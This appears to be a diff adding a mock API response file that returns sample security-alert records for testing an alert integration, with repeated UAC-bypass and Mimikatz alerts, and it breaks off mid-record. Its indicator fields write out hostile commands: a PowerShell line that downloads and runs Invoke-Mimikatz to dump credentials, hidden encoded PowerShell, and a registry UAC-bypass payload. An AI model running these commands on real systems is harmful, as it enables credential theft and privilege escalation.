@@ -1,0 +1,2111 @@
+{
+  "priority": 1,
+  "request": {
+    "urlPath": "/v3.0/workbench/alerts",
+    "method": "GET",
+    "queryParameters": {
+      "startDateTime": {
+        "equalTo": "next_link"
+      },
+      "endDateTime": {
+        "matches": ".*"
+      }
+    }
+  },
+  "response": {
+    "status": 200,
+    "transformers": [
+      "response-template"
+    ],
+    "jsonBody": {
+      "totalCount": 10,
+      "count": 10,
+      "nextLink": "https://{{request.host}}{{request.path}}?skipToken=c2tpcFRva2Vu",
+      "items": [
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00001",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Privilege Escalation via UAC Bypass",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:31Z",
+          "updatedDateTime": "2022-09-06T02:49:48Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7,
+                  8
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
+          "matchedRules": [
+            {
+              "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
+              "name": "(T1088) Bypass UAC via shell open registry",
+              "matchedFilters": [
+                {
+                  "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
+                  "name": "Bypass UAC Via Shell Open Default Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                },
+                {
+                  "id": "857b6396-da29-44a8-bc11-25298e646795",
+                  "name": "Bypass UAC Via Shell Open Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "T1088",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "registry_value",
+              "field": "objectRegistryValue",
+              "value": "delegateexecute",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 8,
+              "type": "registry_value_data",
+              "field": "objectRegistryData",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00002",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Credential Dumping via Mimikatz",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:30Z",
+          "updatedDateTime": "2022-09-06T02:49:50Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+          "matchedRules": [
+            {
+              "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
+              "name": "Potential Credential Dumping via Mimikatz",
+              "matchedFilters": [
+                {
+                  "id": "49d327c4-361f-43f0-b66c-cab433495e42",
+                  "name": "Possible Credential Dumping via Mimikatz",
+                  "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                  "mitreTechniqueIds": [
+                    "V9.T1003.001",
+                    "V9.T1059.003",
+                    "V9.T1212"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
+                      "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                      "type": "TELEMETRY_PROCESS"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "objectCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "file_sha1",
+              "field": "objectFileHashSha1",
+              "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "fullpath",
+              "field": "objectFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "fullpath",
+              "field": "processFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "text",
+              "field": "endpointHostName",
+              "value": "Nimda",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00003",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Privilege Escalation via UAC Bypass",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:31Z",
+          "updatedDateTime": "2022-09-06T02:49:48Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7,
+                  8
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
+          "matchedRules": [
+            {
+              "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
+              "name": "(T1088) Bypass UAC via shell open registry",
+              "matchedFilters": [
+                {
+                  "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
+                  "name": "Bypass UAC Via Shell Open Default Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                },
+                {
+                  "id": "857b6396-da29-44a8-bc11-25298e646795",
+                  "name": "Bypass UAC Via Shell Open Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "T1088",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "registry_value",
+              "field": "objectRegistryValue",
+              "value": "delegateexecute",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 8,
+              "type": "registry_value_data",
+              "field": "objectRegistryData",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00004",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Credential Dumping via Mimikatz",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:30Z",
+          "updatedDateTime": "2022-09-06T02:49:50Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+          "matchedRules": [
+            {
+              "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
+              "name": "Potential Credential Dumping via Mimikatz",
+              "matchedFilters": [
+                {
+                  "id": "49d327c4-361f-43f0-b66c-cab433495e42",
+                  "name": "Possible Credential Dumping via Mimikatz",
+                  "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                  "mitreTechniqueIds": [
+                    "V9.T1003.001",
+                    "V9.T1059.003",
+                    "V9.T1212"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
+                      "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                      "type": "TELEMETRY_PROCESS"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "objectCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "file_sha1",
+              "field": "objectFileHashSha1",
+              "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "fullpath",
+              "field": "objectFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "fullpath",
+              "field": "processFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "text",
+              "field": "endpointHostName",
+              "value": "Nimda",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00005",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Privilege Escalation via UAC Bypass",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:31Z",
+          "updatedDateTime": "2022-09-06T02:49:48Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7,
+                  8
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
+          "matchedRules": [
+            {
+              "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
+              "name": "(T1088) Bypass UAC via shell open registry",
+              "matchedFilters": [
+                {
+                  "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
+                  "name": "Bypass UAC Via Shell Open Default Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                },
+                {
+                  "id": "857b6396-da29-44a8-bc11-25298e646795",
+                  "name": "Bypass UAC Via Shell Open Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "T1088",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "registry_value",
+              "field": "objectRegistryValue",
+              "value": "delegateexecute",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 8,
